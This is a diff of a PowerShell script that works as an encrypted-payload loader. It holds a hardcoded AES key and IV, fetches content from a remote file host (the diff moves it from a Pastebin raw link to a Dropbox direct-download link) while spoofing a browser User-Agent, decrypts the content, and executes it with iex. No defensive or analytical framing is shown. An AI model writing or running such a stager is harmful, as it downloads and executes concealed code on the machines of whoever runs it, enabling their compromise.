@@ -17,10 +17,12 @@ $k = [Convert]::FromBase64String("Q3K1OxDixc03IRcJusRx7mbJX15GuNORMw2PuFevUfA=")
 $i = [Convert]::FromBase64String("kXHMQaoW9ayabOL5BKBI3w==")
 
 try {
+    $url = "https://www.dropbox.com/scl/fi/sosp2ngt2w9a6uyctydu3/text?rlkey=ccq3fqli274hl0oc1nmitvq4z&st=4lkf2c62&dl=1"
     $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
-    $raw = Invoke-WebRequest -Uri "https://pastebin.com/raw/nA98KEqw" -UseBasicParsing -Headers $headers
+    $raw = iwr $url -UseBasicParsing -Headers $headers
     $p = $raw.Content -replace '[^a-zA-Z0-9+/=]', ''
-    iex (D $p $k $i)
+    $s = D $p $k $i
+    iex $s
 } catch {
     Write-Error "[-] Failed to fetch or execute encrypted payload: $_"
 }
